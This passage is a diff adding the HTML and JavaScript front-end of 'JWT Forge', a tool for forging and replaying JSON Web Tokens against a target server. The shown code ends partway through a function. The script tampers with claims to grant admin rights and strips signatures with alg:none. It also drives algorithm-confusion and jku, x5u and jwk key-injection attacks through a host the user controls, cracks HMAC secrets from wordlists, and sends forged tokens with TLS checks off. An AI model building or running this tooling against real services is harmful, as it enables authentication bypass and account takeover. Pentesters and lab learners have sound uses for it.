@@ -1,0 +1,804 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>JWT Forge</title>
+<style>
+  :root{
+    --bg:#0b0e14; --panel:#12161f; --panel2:#171c28; --border:#232a3a;
+    --text:#d7dbe6; --dim:#8a93a6; --faint:#5b6478;
+    --accent:#4fd1c5; --accent-dim:#2b8a82;
+    --seg-h:#ff6b81; --seg-p:#c792ea; --seg-s:#4fd1c5;
+    --crit:#ff6b81; --high:#f2b45a; --info:#6ea8fe; --ok:#5ddc9a;
+    --mono:ui-monospace,"JetBrains Mono","Cascadia Code",Menlo,Consolas,monospace;
+    --sans:ui-sans-serif,system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
+    --r:10px;
+  }
+  *{box-sizing:border-box}
+  html,body{margin:0}
+  body{background:var(--bg);color:var(--text);font-family:var(--sans);
+    font-size:14px;line-height:1.5;-webkit-font-smoothing:antialiased}
+  a{color:var(--accent)}
+  h1,h2,h3{margin:0;font-weight:600}
+  code,pre,textarea,input,.mono{font-family:var(--mono)}
+
+  header.top{display:flex;align-items:baseline;gap:14px;padding:18px 22px;
+    border-bottom:1px solid var(--border);position:sticky;top:0;background:var(--bg);z-index:20}
+  .brand{font-family:var(--mono);font-weight:700;letter-spacing:.5px;font-size:18px}
+  .brand .dot{color:var(--seg-h)} .brand .dot2{color:var(--seg-p)} .brand .dot3{color:var(--seg-s)}
+  .tagline{color:var(--dim);font-size:12.5px}
+  .top .spacer{flex:1}
+  .badge-ready{font-size:11.5px;color:var(--faint);border:1px solid var(--border);
+    border-radius:999px;padding:3px 10px}
+  .badge-ready.live{color:var(--ok);border-color:var(--accent-dim)}
+
+  .wrap{display:grid;grid-template-columns:minmax(0,1.15fr) minmax(0,1fr);
+    gap:18px;padding:18px 22px;max-width:1500px;margin:0 auto}
+  @media(max-width:1024px){.wrap{grid-template-columns:1fr}}
+  .col{display:flex;flex-direction:column;gap:18px;min-width:0}
+
+  .card{background:var(--panel);border:1px solid var(--border);border-radius:var(--r);
+    overflow:hidden}
+  .card>.hd{display:flex;align-items:center;gap:10px;padding:12px 15px;
+    border-bottom:1px solid var(--border);background:var(--panel2)}
+  .card>.hd h2{font-size:13px;letter-spacing:.4px;text-transform:uppercase;color:var(--dim)}
+  .card>.hd .n{font-family:var(--mono);color:var(--faint);font-size:12px}
+  .card>.bd{padding:15px;display:flex;flex-direction:column;gap:12px}
+
+  label.fl{display:block;font-size:11.5px;color:var(--dim);margin:0 0 5px;letter-spacing:.3px}
+  textarea,input[type=text],input[type=url],select{width:100%;background:var(--bg);
+    color:var(--text);border:1px solid var(--border);border-radius:8px;padding:9px 11px;
+    font-size:13px;outline:none;resize:vertical}
+  textarea:focus,input:focus,select:focus{border-color:var(--accent-dim)}
+  textarea{min-height:76px;line-height:1.45}
+  input::placeholder,textarea::placeholder{color:var(--faint)}
+
+  .row{display:flex;gap:9px;flex-wrap:wrap;align-items:center}
+  .row.tight{gap:6px}
+  .grow{flex:1;min-width:0}
+
+  button{font-family:var(--sans);font-size:13px;font-weight:500;cursor:pointer;
+    border-radius:8px;border:1px solid var(--border);background:var(--panel2);
+    color:var(--text);padding:8px 13px;transition:.12s border-color,.12s background}
+  button:hover{border-color:var(--accent-dim)}
+  button:active{transform:translateY(1px)}
+  button.primary{background:var(--accent-dim);border-color:var(--accent-dim);color:#04110f}
+  button.primary:hover{background:var(--accent)}
+  button.ghost{background:transparent}
+  button.sm{padding:5px 9px;font-size:12px}
+  button:disabled{opacity:.5;cursor:not-allowed}
+
+  .chips{display:flex;gap:6px;flex-wrap:wrap}
+  .chip{font-family:var(--mono);font-size:11.5px;padding:4px 9px;border-radius:999px;
+    border:1px dashed var(--border);color:var(--dim);cursor:pointer;background:transparent}
+  .chip:hover{border-color:var(--accent-dim);color:var(--text)}
+
+  /* the signature element: live tri-color token strip */
+  .tokenstrip{font-family:var(--mono);font-size:12.5px;word-break:break-all;
+    background:var(--bg);border:1px solid var(--border);border-radius:8px;padding:12px 13px;
+    line-height:1.7}
+  .tokenstrip .seg-h{color:var(--seg-h)}
+  .tokenstrip .seg-p{color:var(--seg-p)}
+  .tokenstrip .seg-s{color:var(--seg-s)}
+  .tokenstrip .dot{color:var(--faint);padding:0 1px}
+  .tokenstrip .empty{color:var(--faint)}
+  .legend{display:flex;gap:14px;font-size:11px;color:var(--dim)}
+  .legend i{width:9px;height:9px;border-radius:2px;display:inline-block;margin-right:5px;
+    vertical-align:middle}
+  .legend .lh{background:var(--seg-h)} .legend .lp{background:var(--seg-p)} .legend .ls{background:var(--seg-s)}
+
+  .jsons{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+  @media(max-width:620px){.jsons{grid-template-columns:1fr}}
+  .jbox label.fl span{font-family:var(--mono)}
+  .jbox.h textarea{border-left:3px solid var(--seg-h)}
+  .jbox.p textarea{border-left:3px solid var(--seg-p)}
+  .jbox textarea{min-height:150px}
+  .jerr{color:var(--crit);font-size:11.5px;min-height:14px}
+
+  fieldset{border:1px solid var(--border);border-radius:8px;padding:11px;margin:0}
+  legend{font-size:11px;color:var(--dim);padding:0 6px;letter-spacing:.3px;text-transform:uppercase}
+  .signopts{display:flex;flex-direction:column;gap:8px}
+  .signrow{display:flex;align-items:center;gap:8px;flex-wrap:wrap}
+  .signrow label{font-size:13px;display:flex;align-items:center;gap:7px;cursor:pointer}
+  .signrow input[type=radio]{accent-color:var(--accent)}
+  .signrow .keyin{flex:1;min-width:180px;display:none}
+  .signrow.active .keyin{display:block}
+
+  .attack{border:1px solid var(--border);border-radius:8px;padding:10px 11px;
+    display:flex;flex-direction:column;gap:7px;background:var(--panel2)}
+  .attack .top{display:flex;align-items:center;gap:9px}
+  .attack .name{font-weight:600;font-size:13px}
+  .attack .notes{color:var(--dim);font-size:12px}
+  .attack .tok{font-family:var(--mono);font-size:11px;color:var(--faint);
+    word-break:break-all;max-height:34px;overflow:hidden}
+  .attack.disabled{opacity:.6}
+  .sev{font-size:10px;font-weight:700;letter-spacing:.5px;text-transform:uppercase;
+    padding:2px 7px;border-radius:999px;border:1px solid}
+  .sev.critical{color:var(--crit);border-color:var(--crit)}
+  .sev.high{color:var(--high);border-color:var(--high)}
+  .sev.info{color:var(--info);border-color:var(--info)}
+  .cat{font-size:11px;color:var(--faint);font-family:var(--mono)}
+  .attack .acts{display:flex;gap:6px;margin-left:auto}
+
+  .resp .status{display:flex;gap:12px;align-items:center;flex-wrap:wrap;font-size:12.5px}
+  .pill{font-family:var(--mono);font-weight:700;padding:3px 10px;border-radius:6px;
+    border:1px solid var(--border)}
+  .pill.s2{color:var(--ok);border-color:var(--accent-dim)}
+  .pill.s3{color:var(--info);border-color:var(--info)}
+  .pill.s4,.pill.s5{color:var(--crit);border-color:var(--crit)}
+  .meta{color:var(--dim);font-size:12px}
+  pre.out{background:var(--bg);border:1px solid var(--border);border-radius:8px;
+    padding:11px;max-height:340px;overflow:auto;font-size:12px;white-space:pre-wrap;
+    word-break:break-word;margin:0}
+  pre.out.small{max-height:150px}
+
+  .kv{font-family:var(--mono);font-size:11.5px;color:var(--dim);white-space:pre-wrap;
+    word-break:break-all}
+  .toast{position:fixed;bottom:18px;left:50%;transform:translateX(-50%);
+    background:var(--panel2);border:1px solid var(--accent-dim);color:var(--text);
+    padding:9px 16px;border-radius:8px;font-size:13px;opacity:0;pointer-events:none;
+    transition:.2s;z-index:50}
+  .toast.show{opacity:1}
+  .hint{color:var(--faint);font-size:11.5px}
+  .split{height:1px;background:var(--border);margin:2px 0}
+  .flexcol{display:flex;flex-direction:column;gap:10px}
+  .muted{color:var(--dim)}
+  .prog{height:4px;background:var(--border);border-radius:3px;overflow:hidden;display:none}
+  .prog.show{display:block}
+  .prog>i{display:block;height:100%;width:0;background:var(--accent);transition:.15s width}
+
+  .btbl{width:100%;border-collapse:collapse;font-size:12.5px;margin-top:4px}
+  .btbl th,.btbl td{text-align:left;padding:6px 8px;border-bottom:1px solid var(--border);vertical-align:top}
+  .btbl th{color:var(--dim);font-weight:500;font-size:10.5px;text-transform:uppercase;letter-spacing:.3px}
+  .btbl td.name{font-size:12px}
+  .btbl tr.hit{background:rgba(93,220,154,.08)}
+  .btbl tr.diff{background:rgba(242,180,90,.07)}
+  .btbl tr.base td{color:var(--dim)}
+  .btbl .st{font-family:var(--mono);font-weight:700}
+  .btbl .st.s2{color:var(--ok)} .btbl .st.s3{color:var(--info)}
+  .btbl .st.s4,.btbl .st.s5{color:var(--crit)} .btbl .st.err{color:var(--faint)}
+  .btbl .flag{font-size:10px;font-weight:700;color:var(--ok);margin-left:6px}
+  .btbl button.mini{padding:3px 7px;font-size:11px}
+</style>
+</head>
+<body>
+<header class="top">
+  <span class="brand">jwt<span class="dot">.</span>forge<span class="dot2">.</span><span class="dot3">·</span></span>
+  <span class="tagline">craft · attack · replay — nothing stored</span>
+  <span class="spacer"></span>
+  <span id="ready" class="badge-ready">no target loaded</span>
+</header>
+
+<div class="wrap">
+  <!-- LEFT COLUMN -->
+  <div class="col">
+
+    <!-- IMPORT -->
+    <section class="card">
+      <div class="hd"><span class="n">01</span><h2>Import</h2></div>
+      <div class="bd">
+        <div>
+          <label class="fl">Paste a raw HTTP request (Burp / devtools) or just a token</label>
+          <textarea id="importbox" placeholder="GET /my-account HTTP/1.1&#10;Host: lab.example.net&#10;Authorization: Bearer eyJhbGciOi...&#10;&#10;— or paste only the eyJ... token"></textarea>
+        </div>
+        <div class="row">
+          <button class="primary" onclick="doImport()">Extract token &amp; target</button>
+          <button class="ghost" onclick="loadSample()">Load sample</button>
+          <span id="importinfo" class="hint"></span>
+        </div>
+      </div>
+    </section>
+
+    <!-- EDITOR -->
+    <section class="card">
+      <div class="hd"><span class="n">02</span><h2>Editor</h2>
+        <span class="legend" style="margin-left:auto">
+          <span><i class="lh"></i>header</span><span><i class="lp"></i>payload</span><span><i class="ls"></i>signature</span>
+        </span>
+      </div>
+      <div class="bd">
+        <div id="strip" class="tokenstrip"><span class="empty">build or import a token to see it here</span></div>
+
+        <div class="jsons">
+          <div class="jbox h">
+            <label class="fl"><span>HEADER</span></label>
+            <textarea id="hdr" spellcheck="false" oninput="onEdit()">{
+  "alg": "HS256",
+  "typ": "JWT"
+}</textarea>
+            <div id="hdrerr" class="jerr"></div>
+          </div>
+          <div class="jbox p">
+            <label class="fl"><span>PAYLOAD</span></label>
+            <textarea id="pl" spellcheck="false" oninput="onEdit()">{
+  "sub": "guest"
+}</textarea>
+            <div id="plerr" class="jerr"></div>
+          </div>
+        </div>
+
+        <div>
+          <label class="fl">Quick claim tampering</label>
+          <div class="chips" id="chips"></div>
+        </div>
+
+        <fieldset>
+          <legend>Signing</legend>
+          <div class="signopts" id="signopts">
+            <div class="signrow active" data-m="keep">
+              <label><input type="radio" name="sign" value="keep" checked onchange="onSignMode()">
+                Keep original signature <span class="hint">(tamper payload, server never verifies)</span></label>
+            </div>
+            <div class="signrow" data-m="none">
+              <label><input type="radio" name="sign" value="none" onchange="onSignMode()">
+                alg: none <span class="hint">(strip signature)</span></label>
+            </div>
+            <div class="signrow" data-m="hmac">
+              <label><input type="radio" name="sign" value="hmac" onchange="onSignMode()"> Re-sign HMAC</label>
+              <select id="hmacalg" class="keyin" style="max-width:110px">
+                <option>HS256</option><option>HS384</option><option>HS512</option></select>
+              <input class="keyin grow" id="hmacsecret" type="text" placeholder="secret (blank allowed)">
+            </div>
+            <div class="signrow" data-m="pk">
+              <label><input type="radio" name="sign" value="pk" onchange="onSignMode()"> Re-sign with private key</label>
+              <select id="pkalg" class="keyin" style="max-width:110px">
+                <option>RS256</option><option>RS384</option><option>RS512</option>
+                <option>PS256</option><option>PS384</option><option>PS512</option>
+                <option>ES256</option><option>ES384</option><option>ES512</option></select>
+            </div>
+            <textarea id="pkpem" class="keyin" placeholder="-----BEGIN PRIVATE KEY-----" style="display:none"></textarea>
+          </div>
+          <div class="row" style="margin-top:10px">
+            <button class="primary" onclick="buildToken()">Build token</button>
+            <button class="ghost sm" onclick="copyActive()">Copy</button>
+            <button class="ghost sm" onclick="useInRequest()">Use in request →</button>
+          </div>
+        </fieldset>
+      </div>
+    </section>
+
+    <!-- ATTACKS -->
+    <section class="card">
+      <div class="hd"><span class="n">03</span><h2>Attacks</h2></div>
+      <div class="bd">
+        <div class="row">
+          <div class="grow">
+            <label class="fl">Target public key — PEM or JWK (enables algorithm confusion)</label>
+            <textarea id="pubkey" placeholder="-----BEGIN PUBLIC KEY-----  … or  {\"kty\":\"RSA\",\"n\":…}" style="min-height:56px"></textarea>
+          </div>
+        </div>
+        <div class="row">
+          <div class="grow">
+            <label class="fl">Attacker URL for jku (a host you control that will serve the JWKS)</label>
+            <input id="atturl" type="url" placeholder="https://YOUR-HOST/jwks.json">
+          </div>
+        </div>
+        <div class="row">
+          <button class="primary" onclick="runAttacks()">Generate all attacks</button>
+          <button onclick="runAllAgainstTarget()">Run all against target →</button>
+          <span id="attinfo" class="hint"></span>
+        </div>
+        <div class="prog" id="batchprog"><i></i></div>
+        <div id="batch"></div>
+        <div id="attacks" class="flexcol"></div>
+        <div id="artifacts" class="flexcol"></div>
+      </div>
+    </section>
+
+    <!-- KEY INJECTION BUILDER -->
+    <section class="card">
+      <div class="hd"><span class="n">04</span><h2>Key injection builder</h2></div>
+      <div class="bd">
+        <div class="hint">Craft a header that makes the server trust a key you control — the token
+          is signed and the header is written for you.</div>
+        <div class="row">
+          <div class="grow">
+            <label class="fl">Mode</label>
+            <select id="craftmode" onchange="onCraftMode()">
+              <option value="jwk">Embed public key in header — jwk (nothing to host)</option>
+              <option value="x5c">Embed certificate in header — x5c (nothing to host)</option>
+              <option value="jku">Point header at your JWKS URL — jku</option>
+              <option value="x5u">Point header at your certificate URL — x5u</option>
+            </select>
+          </div>
+          <div>
+            <label class="fl">Algorithm</label>
+            <select id="craftalg" style="max-width:104px">
+              <option>RS256</option><option>RS384</option><option>RS512</option>
+              <option>PS256</option><option>PS384</option><option>PS512</option>
+            </select>
+          </div>
+        </div>
+        <div id="crafturlrow" style="display:none">
+          <label class="fl" id="crafturllbl">JWKS URL — a host you control</label>
+          <input id="crafturl" type="url" placeholder="https://YOUR-HOST/jwks.json">
+        </div>
+        <details>
+          <summary class="hint" style="cursor:pointer">Use a specific private key (optional — a fresh one is minted otherwise)</summary>
+          <textarea id="craftpriv" placeholder="-----BEGIN PRIVATE KEY-----" style="min-height:64px;margin-top:8px"></textarea>
+        </details>
+        <div class="row">
+          <button class="primary" onclick="craftInjection()">Craft token &amp; header</button>
+          <span id="craftinfo" class="hint"></span>
+        </div>
+        <div id="craftout" class="flexcol"></div>
+      </div>
+    </section>
+
+    <!-- WEAK SECRET + KEYS -->
+    <section class="card">
+      <div class="hd"><span class="n">05</span><h2>Weak secret &amp; keys</h2></div>
+      <div class="bd">
+        <div>
+          <label class="fl">Wordlist for HS* secret cracking (read in your browser, tested chunk-by-chunk)</label>
+          <div class="row">
+            <input id="wlfile" type="file" accept=".txt,.lst" style="border:none;padding-left:0">
+            <button onclick="crackFile()">Crack current token</button>
+          </div>
+          <div class="prog" id="crackprog"><i></i></div>
+          <div id="crackinfo" class="hint"></div>
+        </div>
+        <div class="split"></div>
+        <div class="row">
+          <button onclick="genKey('rsa')">Generate RSA-2048</button>
+          <button onclick="genKey('ec')">Generate EC P-256</button>
+          <span class="hint">for jku / embedded-jwk / x5u tests</span>
+        </div>
+        <div id="keyout" class="flexcol"></div>
+      </div>
+    </section>
+  </div>
+
+  <!-- RIGHT COLUMN -->
+  <div class="col">
+    <section class="card">
+      <div class="hd"><span class="n">06</span><h2>Send &amp; replay</h2></div>
+      <div class="bd">
+        <div class="row tight">
+          <select id="method" style="max-width:110px">
+            <option>GET</option><option>POST</option><option>PUT</option>
+            <option>PATCH</option><option>DELETE</option><option>OPTIONS</option></select>
+          <input id="url" class="grow" type="url" placeholder="https://target/endpoint">
+        </div>
+        <div>
+          <label class="fl">Headers (one per line — <code>Name: value</code>)</label>
+          <textarea id="headers" spellcheck="false" placeholder="Authorization: Bearer &lt;token&gt;&#10;Content-Type: application/json"></textarea>
+        </div>
+        <div>
+          <label class="fl">Body</label>
+          <textarea id="reqbody" spellcheck="false" placeholder="(empty)"></textarea>
+        </div>
+        <div class="row">
+          <label class="fl" style="margin:0">Inject active token into</label>
+          <select id="injloc" style="max-width:220px">
+            <option value="authorization">Authorization: Bearer</option>
+            <option value="authorization-raw">Authorization: (no prefix)</option>
+            <option value="cookie">Cookie (name below)</option>
+            <option value="body">Body (replace old token)</option>
+            <option value="none">— leave headers as typed —</option>
+          </select>
+          <input id="cookiename" type="text" placeholder="cookie name" style="max-width:140px">
+          <button class="ghost sm" onclick="injectToken()">Inject</button>
+        </div>
+        <div class="row">
+          <button class="primary" onclick="sendReq()">Send</button>
+          <label class="hint"><input type="checkbox" id="insecure" checked> ignore TLS</label>
+          <label class="hint"><input type="checkbox" id="redir"> follow redirects</label>
+        </div>
+        <div class="resp" id="resp"></div>
+      </div>
+    </section>
+
+    <section class="card">
+      <div class="hd"><span class="n">07</span><h2>Payload clipboard</h2></div>
+      <div class="bd">
+        <div class="hint">Every token you build or generate lands here for manual testing.</div>
+        <div id="clipboard" class="flexcol"></div>
+      </div>
+    </section>
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+const $=s=>document.querySelector(s), $$=s=>[...document.querySelectorAll(s)];
+let ACTIVE=null;            // current active token string
+let ORIG_SIG="";           // original signature b64 from the last decoded token
+let ORIG_TOKEN=null;       // the token as originally imported (batch baseline)
+let GEN=[];                // ready attack tokens from the last generate run
+let SAVED=[];              // payload clipboard
+
+function toast(m){const t=$('#toast');t.textContent=m;t.classList.add('show');
+  clearTimeout(t._t);t._t=setTimeout(()=>t.classList.remove('show'),1600);}
+async function api(path,body){
+  const r=await fetch(path,{method:'POST',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify(body||{})});
+  const j=await r.json();
+  if(j&&j.error) throw new Error(j.error);
+  return j;
+}
+function parseJSON(id,errid){
+  try{const v=JSON.parse($(id).value);$(errid).textContent='';return v;}
+  catch(e){$(errid).textContent='invalid JSON: '+e.message;return undefined;}
+}
+function b64urlDecode(s){s=s.replace(/-/g,'+').replace(/_/g,'/');
+  while(s.length%4)s+='=';try{return atob(s);}catch(e){return null;}}
+function b64urlJSON(s){const d=b64urlDecode(s);if(d===null)return null;
+  try{return JSON.parse(d);}catch(e){return null;}}
+
+/* ---------- live tri-color token strip ---------- */
+function renderStrip(tok){
+  const el=$('#strip');
+  if(!tok){el.innerHTML='<span class="empty">build or import a token to see it here</span>';return;}
+  const p=tok.split('.');
+  const h=`<span class="seg-h">${p[0]||''}</span>`;
+  const pl=`<span class="seg-p">${p[1]||''}</span>`;
+  const s=p[2]!==undefined?`<span class="seg-s">${p[2]||'<span class="empty">∅</span>'}</span>`:'';
+  el.innerHTML=h+'<span class="dot">.</span>'+pl+(p.length>2?'<span class="dot">.</span>'+s:'');
+}
+
+/* ---------- editing ---------- */
+function onEdit(){
+  const h=parseJSON('#hdr','#hdrerr'), p=parseJSON('#pl','#plerr');
+  if(h===undefined||p===undefined)return;
+  // reflect edits into the strip using current signing choice, cheaply (local encode for preview)
+  previewStrip(h,p);
+}
+function localEncode(obj){return btoa(unescape(encodeURIComponent(JSON.stringify(obj))))
+  .replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');}
+function previewStrip(h,p){
+  const mode=document.querySelector('input[name=sign]:checked').value;
+  const sig=(mode==='keep')?ORIG_SIG:(mode==='none'?'':'…');
+  renderStrip(localEncode(h)+'.'+localEncode(p)+'.'+sig);
+}
+
+const CLAIMS=[['admin',true],['role','"admin"'],['isAdmin',true],['sub','"administrator"'],
+  ['user','"administrator"'],['scope','"admin"']];
+function buildChips(){
+  $('#chips').innerHTML='';
+  CLAIMS.forEach(([k,v])=>{
+    const c=document.createElement('span');c.className='chip';c.textContent=`${k}=${v}`;
+    c.onclick=()=>patchClaim(k,JSON.parse(v));$('#chips').appendChild(c);
+  });
+}
+function patchClaim(k,v){
+  const p=parseJSON('#pl','#plerr');if(p===undefined)return;
+  p[k]=v;$('#pl').value=JSON.stringify(p,null,2);onEdit();toast(`set ${k}`);
+}
+
+function onSignMode(){
+  const m=document.querySelector('input[name=sign]:checked').value;
+  $$('.signrow').forEach(r=>r.classList.toggle('active',r.dataset.m===m||
+    (m==='pk'&&r.dataset.m==='pk')));
+  $('#pkpem').style.display=(m==='pk')?'block':'none';
+  onEdit();
+}
+
+async function buildToken(){
+  const h=parseJSON('#hdr','#hdrerr'), p=parseJSON('#pl','#plerr');
+  if(h===undefined||p===undefined){toast('fix JSON first');return;}
+  const m=document.querySelector('input[name=sign]:checked').value;
+  let signing;
+  if(m==='keep'){signing={method:'keep',signature:ORIG_SIG};}
+  else if(m==='none'){h.alg='none';signing={method:'none'};}
+  else if(m==='hmac'){const alg=$('#hmacalg').value;h.alg=alg;
+    signing={method:'hmac',alg,secret:$('#hmacsecret').value};}
+  else{const alg=$('#pkalg').value;h.alg=alg;
+    const method=alg.startsWith('ES')?'ec':'rsa';
+    signing={method,alg,private_key:$('#pkpem').value};}
+  try{
+    const {token}=await api('/api/sign',{header:h,payload:p,signing});
+    setActive(token);save(token,'built · '+m);$('#hdr').value=JSON.stringify(h,null,2);
+    toast('token built');
+  }catch(e){toast(e.message);}
+}
+function setActive(tok){ACTIVE=tok;renderStrip(tok);}
+
+/* ---------- import ---------- */
+async function doImport(){
+  const raw=$('#importbox').value.trim();if(!raw){toast('paste something');return;}
+  const looksToken=/^(bearer\s+)?eyJ[\w-]+\.[\w-]+\.?[\w-]*$/i.test(raw);
+  try{
+    if(looksToken){await loadToken(raw.replace(/^bearer\s+/i,''));
+      $('#importinfo').textContent='token decoded';return;}
+    const r=await api('/api/parse',{raw});
+    $('#method').value=r.method;$('#url').value=r.url;
+    $('#headers').value=Object.entries(r.headers).map(([k,v])=>`${k}: ${v}`).join('\n');
+    $('#reqbody').value=r.body||'';
+    if(r.token_location&&r.token_location.startsWith('cookie:'))
+      $('#cookiename').value=r.token_location.split(':')[1];
+    $('#injloc').value=r.token_location?.startsWith('cookie')?'cookie':
+      (r.token_location==='body'?'body':'authorization');
+    if(r.token){await loadToken(r.token);
+      $('#importinfo').textContent=`target + token found in ${r.token_location}`;
+      markReady();}
+    else $('#importinfo').textContent='target parsed, but no JWT found';
+  }catch(e){toast(e.message);}
+}
+async function loadToken(tok){
+  const d=await api('/api/decode',{token:tok});
+  $('#hdr').value=JSON.stringify(d.header,null,2);
+  $('#pl').value=JSON.stringify(d.payload,null,2);
+  ORIG_SIG=d.signature||'';ORIG_TOKEN=tok;setActive(tok);save(tok,'imported');
+  onEdit();markReady();
+}
+function markReady(){const b=$('#ready');b.textContent='target ready';b.classList.add('live');}
+
+/* ---------- attacks ---------- */
+async function runAttacks(){
+  if(!ACTIVE){toast('load or build a token first');return;}
+  const claimsObj=parseJSON('#pl','#plerr'); // send current payload as the desired claims
+  const body={token:ACTIVE};
+  const pub=$('#pubkey').value.trim();if(pub)body.public_key=pub;
+  const url=$('#atturl').value.trim();if(url)body.attacker_url=url;
+  // treat the payload you edited as the claim set to bake into every attack
+  if(claimsObj&&typeof claimsObj==='object')body.claims=claimsObj;
+  $('#attinfo').textContent='generating…';
+  try{
+    const r=await api('/api/attacks',body);
+    GEN=r.generated.filter(g=>g.token).map(g=>({name:g.name,token:g.token,severity:g.severity}));
+    renderAttacks(r);$('#attinfo').textContent=`${GEN.length} ready`;
+  }catch(e){$('#attinfo').textContent='';toast(e.message);}
+}
+function renderAttacks(r){
+  const box=$('#attacks');box.innerHTML='';
+  r.generated.forEach(g=>{
+    const el=document.createElement('div');
+    el.className='attack'+(g.token?'':' disabled');
+    const sev=g.severity||'info';
+    el.innerHTML=`<div class="top">
+        <span class="sev ${sev}">${sev}</span>
+        <span class="name">${esc(g.name)}</span>
+        <span class="cat">${esc(g.category)}</span>
+        <span class="acts"></span></div>
+      <div class="notes">${esc(g.notes||'')}${g.requires.length?` — needs: ${g.requires.join(', ')}`:''}</div>
+      ${g.token?`<div class="tok">${esc(g.token)}</div>`:''}`;
+    const acts=el.querySelector('.acts');
+    if(g.token){
+      acts.appendChild(mkbtn('Copy',()=>{copy(g.token);}));
+      acts.appendChild(mkbtn('Use',()=>{setActive(g.token);
+        $('#hdr').value=JSON.stringify(g.header,null,2);
+        $('#pl').value=JSON.stringify(g.payload,null,2);
+        ORIG_SIG=(g.token.split('.')[2]||'');save(g.token,g.name);toast('active: '+g.name);}));
+      acts.appendChild(mkbtn('Send',async()=>{setActive(g.token);injectToken();await sendReq();}));
+      save(g.token,g.name,true);
+    }
+    box.appendChild(el);
+  });
+  // artifacts
+  const ab=$('#artifacts');ab.innerHTML='';
+  if(r.artifacts&&r.artifacts.jwks_to_host){
+    const j=r.artifacts.jwks_to_host;
+    ab.appendChild(artifact('JWKS to host at '+j.url,JSON.stringify(j.content,null,2)));
+  }
+  if(r.artifacts&&r.artifacts.generated_keypair){
+    ab.appendChild(artifact('Generated private key (used for jku / jwk)',
+      r.artifacts.generated_keypair.private_key));
+  }
+}
+function artifact(title,text){
+  const d=document.createElement('div');d.className='attack';
+  d.innerHTML=`<div class="top"><span class="name">${esc(title)}</span>
+    <span class="acts"></span></div><pre class="out small">${esc(text)}</pre>`;
+  d.querySelector('.acts').appendChild(mkbtn('Copy',()=>copy(text)));return d;
+}
+function mkbtn(label,fn){const b=document.createElement('button');
+  b.className='ghost sm';b.textContent=label;b.onclick=fn;return b;}
+
+/* ---------- crack (client reads file, backend tests chunks) ---------- */
+async function crackFile(){
+  if(!ACTIVE){toast('load a token first');return;}
+  const f=$('#wlfile').files[0];if(!f){toast('choose a wordlist');return;}
+  const text=await f.text();
+  const words=text.split(/\r?\n/).filter(Boolean);
+  const prog=$('#crackprog');prog.classList.add('show');
+  $('#crackinfo').textContent=`testing ${words.length.toLocaleString()} candidates…`;
+  const CH=20000;let tested=0;
+  for(let i=0;i<words.length;i+=CH){
+    const chunk=words.slice(i,i+CH);
+    try{
+      const r=await api('/api/crack',{token:ACTIVE,wordlist:chunk});
+      tested+=r.tested||chunk.length;
+      prog.firstElementChild.style.width=Math.min(100,100*tested/words.length)+'%';
+      if(r.cracked){$('#crackinfo').innerHTML=`<b style="color:var(--ok)">secret found:</b> <code>${esc(r.secret)}</code>`;
+        $('#hmacsecret').value=r.secret;prog.classList.remove('show');toast('cracked!');return;}
+      if(r.reason){$('#crackinfo').textContent=r.reason;prog.classList.remove('show');return;}
+      $('#crackinfo').textContent=`tested ${tested.toLocaleString()} / ${words.length.toLocaleString()}…`;
+    }catch(e){$('#crackinfo').textContent=e.message;prog.classList.remove('show');return;}
+  }
+  $('#crackinfo').textContent=`no match in ${words.length.toLocaleString()} candidates.`;
+  prog.classList.remove('show');
+}
+
+/* ---------- keygen ---------- */
+async function genKey(type){
+  try{const r=await api('/api/keygen',{type});
+    const box=$('#keyout');box.innerHTML='';
+    box.appendChild(artifact('Private key',r.private_key));
+    box.appendChild(artifact('Public key',r.public_key));
+    box.appendChild(artifact('Public JWK',JSON.stringify(r.jwk,null,2)));
+    toast(type.toUpperCase()+' keypair generated');
+  }catch(e){toast(e.message);}
+}
+
+/* ---------- send ---------- */
+function headersToObj(){
+  const o={};$('#headers').value.split(/\r?\n/).forEach(l=>{
+    const i=l.indexOf(':');if(i>0)o[l.slice(0,i).trim()]=l.slice(i+1).trim();});return o;}
+// build the {headers, body} a request should use for a given token, per inject settings
+function requestFor(tok){
+  const mode=$('#injloc').value;
+  let headers=headersToObj(); let body=$('#reqbody').value;
+  if(mode==='body'){
+    body=body.replace(/eyJ[\w-]+\.[\w-]+\.?[\w-]*/, tok);
+  }else if(mode!=='none'){
+    if(mode==='authorization')headers['Authorization']='Bearer '+tok;
+    else if(mode==='authorization-raw')headers['Authorization']=tok;
+    else if(mode==='cookie'){const name=$('#cookiename').value.trim()||'session';
+      let c=headers['Cookie']||'';const re=new RegExp('(^|;\\s*)'+name+'=[^;]*');
+      headers['Cookie']=c&&re.test(c)?c.replace(re,'$1'+name+'='+tok):(c?c+'; ':'')+name+'='+tok;}
+  }
+  return {headers, body};
+}
+function injectToken(){
+  if(!ACTIVE){toast('no active token');return;}
+  if($('#injloc').value==='none'){toast('left headers unchanged');return;}
+  const {headers,body}=requestFor(ACTIVE);
+  $('#headers').value=Object.entries(headers).map(([k,v])=>`${k}: ${v}`).join('\n');
+  $('#reqbody').value=body;
+  toast('token injected');
+}
+
+/* ---------- key injection builder ---------- */
+function onCraftMode(){
+  const m=$('#craftmode').value, show=(m==='jku'||m==='x5u');
+  $('#crafturlrow').style.display=show?'block':'none';
+  $('#crafturllbl').textContent=m==='x5u'?'Certificate URL — a host you control':'JWKS URL — a host you control';
+  $('#crafturl').placeholder=m==='x5u'?'https://YOUR-HOST/cert.pem':'https://YOUR-HOST/jwks.json';
+}
+async function craftInjection(){
+  if(!ACTIVE){toast('load or build a base token first');return;}
+  const mode=$('#craftmode').value;
+  const body={token:ACTIVE, mode, alg:$('#craftalg').value};
+  if(mode==='jku'||mode==='x5u'){const u=$('#crafturl').value.trim();
+    if(!u){toast('enter your URL');return;} body.url=u;}
+  const priv=$('#craftpriv').value.trim(); if(priv)body.private_key=priv;
+  const claims=parseJSON('#pl','#plerr'); if(claims&&typeof claims==='object')body.claims=claims;
+  $('#craftinfo').textContent='crafting…';
+  try{
+    const r=await api('/api/craft',body);
+    setActive(r.token);
+    $('#hdr').value=JSON.stringify(r.header,null,2);
+    $('#pl').value=JSON.stringify(r.payload,null,2);
+    ORIG_SIG=r.token.split('.')[2]||'';
